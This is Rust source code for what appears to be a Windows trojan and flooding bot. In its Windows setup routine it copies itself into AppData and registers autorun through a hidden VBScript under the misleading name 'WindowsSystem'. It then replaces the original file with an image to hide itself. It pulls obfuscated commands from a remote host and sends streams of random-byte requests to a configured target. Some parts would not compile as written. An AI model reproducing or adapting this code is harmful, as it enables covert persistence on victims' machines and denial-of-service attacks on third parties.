#![allow(dead_code)]
use core::str::FromStr;
use native_tls::{TlsConnector, TlsStream};
use rand::Rng;
use std::{
  collections::HashMap, error, io::Read, io::Result as IResult, io::Write, net::TcpStream,
};

#[allow(dead_code)]
mod image_placeholder;

static BODY_SEPARATOR: &str = "\r\n\r\n";
static CONFIG_SEPARATOR: &str = ";";
static CONFIG_PAIR_SEPARATOR: &str = "=";
static MAX_BUFFER_CHUNK_SIZE: u32 = 1024;
static CONFIG_DECRYPT_CHAR_LEFT_SHIFT: u8 = 13;

pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;

pub type ConfigMap = HashMap<String, String>;

pub trait ConfigManager<'a> {
  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
  where
    T: ToString + FromStr;
}

impl<'a> ConfigManager<'a> for ConfigMap {
  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
  where
    T: ToString + FromStr,
  {
    return self
      .get(key)
      .unwrap_or(&default_value.to_string())
      .parse::<T>()
      .unwrap_or(default_value);
  }
}

#[derive(Debug, Clone)]
pub struct Config {
  pub headers: String,
  pub host: String,
  pub port: u16,
  pub content_length: u32,
  pub thread_count: u16,
  pub call_interval_in_ms: u64,
  pub config_fetch_interval_in_ms: u64,
  pub enabled: bool,
  pub ssl: bool,
}

impl Config {
  pub fn new(
    headers: String,
    content_length: u32,
    thread_count: u16,
    call_interval_in_ms: u64,
    config_fetch_interval_in_ms: u64,
    host: String,
    port: u16,
    enabled: bool,
    ssl: bool,
  ) -> Config {
    Config {
      headers,
      content_length,
      thread_count,
      call_interval_in_ms,
      config_fetch_interval_in_ms,
      host,
      port,
      enabled,
      ssl,
    }
  }

  pub fn get_addr(&self) -> String {
    format!("{}:{}", self.host, self.port)
  }
}

impl From<ConfigMap> for Config {
  fn from(config_map: ConfigMap) -> Config {
    Config::new(
      config_map.safe_get("headers", "GET / HTTP/1.1\nAccept: */*".into()),
      config_map.safe_get("content_length", 1024),
      config_map.safe_get("thread_count", 10),
      config_map.safe_get("call_interval_in_ms", 100),
      config_map.safe_get("config_fetch_interval_in_ms", 3600000),
      config_map.safe_get("host", "localhost".into()),
      config_map.safe_get("port", 80),
      config_map.safe_get("enabled", false),
      config_map.safe_get("ssl", false),
    )
  }
}

#[derive(Debug)]
pub struct Response {
  pub headers: String,
  pub body: String,
}

impl Response {
  pub fn new(headers: String, body: String) -> Response {
    Response { headers, body }
  }

  pub fn decrypted_body(self) -> String {
    decrypt(&self.body)
  }
}

impl Default for Response {
  fn default() -> Response {
    Response::new("".into(), "".into())
  }
}

impl From<String> for Response {
  fn from(s: String) -> Response {
    let res_chunks: Vec<&str> = s.split(BODY_SEPARATOR).collect();

    if res_chunks.len() == 2 {
      Response::new(res_chunks[0].into(), res_chunks[1].into())
    } else {
      Response::default()
    }
  }
}

pub trait Connection {
  fn w(&mut self, buf: &[u8]) -> IResult<usize>;
  fn r(&mut self, buf: &mut String) -> IResult<usize>;
}

impl Connection for TlsStream<TcpStream> {
  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
    self.write(buf)
  }

  fn r(&mut self, buf: &mut String) -> IResult<usize> {
    self.read_to_string(buf)
  }
}

impl Connection for TcpStream {
  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
    self.write(buf)
  }

  fn r(&mut self, buf: &mut String) -> IResult<usize> {
    self.read_to_string(buf)
  }
}

#[cfg(target_os = "macos")]
pub fn setup() -> Result<()> {
  todo!();
}

#[cfg(target_os = "windows")]
pub fn setup() -> Result<()> {
  use std::{
    env, fs,
    process::{exit, Command},
  };
  let home_path = env::home_dir()?.display().to_string();
  let current_path = std::env::current_exe().unwrap().display().to_string();
  let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
  let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
  let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";

  if current_path == target_path {
    let conf = parse_config(fs::read_to_string(&conf_path).unwrap());
    let original_path: String = conf.get("original_path").unwrap();

    loop {
      // Replacing with image;
      match fs::write(&original_path, image_placeholder::get_placeholder_buf()) {
        Ok(_) => break,
        Err(_) => {
          thread::sleep(Duration::from_millis(10));
          continue;
        }
      }
    }
    return;
  }

  fs::copy(&current_path, &target_path).unwrap();

  // Run add and register as autorun
  let vbs_content = format!(
    r#"
    Set oShell = CreateObject("Wscript.Shell")
    oShell.Run "cmd /c {target_path}", 0, false
    oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSystem","{target_path}","REG_SZ"
  "#,
    target_path = target_path
  );
  fs::write(&vbs_path, &vbs_content).unwrap();
  Command::new("wscript").arg(&vbs_path).output().unwrap();
  fs::remove_file(&vbs_path).unwrap();

  // Create config file
  let conf_content = format!(r#"original_path={};"#, current_path);
  fs::write(&conf_path, &conf_content).unwrap();

  exit(0);
}

#[cfg(target_os = "linux")]
pub fn setup() -> Result<()> {
  todo!();
}

#[cfg(other)]
fn setup() -> Result<()> {
  todo!();
}

pub fn get_conf(addr: &str) -> Result<Config> {
  let headers = String::from("GET / HTTP/1.1\nAccept: */*") + BODY_SEPARATOR;
  let mut res = String::new();
  let mut stream = TcpStream::connect(addr)?;

  stream.write(&headers.as_bytes())?;
  stream.read_to_string(&mut res)?;

  let res: Response = Response::from(res);

  let conf = parse_config(&res.decrypted_body());
  let conf = Config::from(conf);

  debug!("Done fetching config {:?}.", conf);

  Ok(conf)
}

pub fn call(conf: &Config) -> Result<Response> {
  let mut stream = create_stream(&conf);
  let body: Vec<u8> = vec![0; conf.content_length as usize]
    .iter()
    .map(|_| gen_random_byte())
    .collect();
  let mut res = String::new();

  stream.w(conf.headers.as_bytes())?;
  stream.w("\n\n".as_bytes())?;

  if conf.content_length > MAX_BUFFER_CHUNK_SIZE {
    for chunk in body.chunks(MAX_BUFFER_CHUNK_SIZE as usize) {
      stream.w(&chunk)?;
    }
  } else {
    stream.w(&body)?;
  }

  stream.w(&[0; 1])?;
  stream.r(&mut res)?;

  debug!("Done calling {}...", conf.get_addr());

  return Ok(Response::from(res));
}

fn create_stream(conf: &Config) -> Box<dyn Connection> {
  if conf.ssl {
    let connector = TlsConnector::new().unwrap();
    let stream = TcpStream::connect(conf.get_addr()).unwrap();

    Box::new(connector.connect(&conf.host, stream).unwrap())
  } else {
    let stream = TcpStream::connect(conf.get_addr()).unwrap();

    Box::new(stream)
  }
}

fn parse_config(s: &str) -> ConfigMap {
  let parsed: ConfigMap = s
    .split(CONFIG_SEPARATOR)
    .map(|line: &str| line.split(CONFIG_PAIR_SEPARATOR).collect())
    .collect::<Vec<Vec<&str>>>()
    .iter()
    .fold(HashMap::<String, String>::new(), |mut conf, pair| {
      if pair.len() == 2 {
        conf.insert(pair[0].trim().to_string(), pair[1].trim().to_string());
      };
      return conf;
    });

  return parsed;
}

fn decrypt(s: &str) -> String {
  return s
    .chars()
    .map(|c| (c as u8 - CONFIG_DECRYPT_CHAR_LEFT_SHIFT as u8) as char)
    .collect::<String>();
}

fn gen_random_byte() -> u8 {
  let mut rng = rand::thread_rng();
  rng.gen::<u8>()
}

#[macro_export]
#[cfg(debug_assertions)]
macro_rules! debug {
  ($($arg:tt)+) => (dbg!(format_args!($($arg)+)))
}

#[macro_export]
#[cfg(not(debug_assertions))]
macro_rules! debug {
  ($($arg:tt)+) => (std::convert::identity(format_args!($($arg)+)))
}
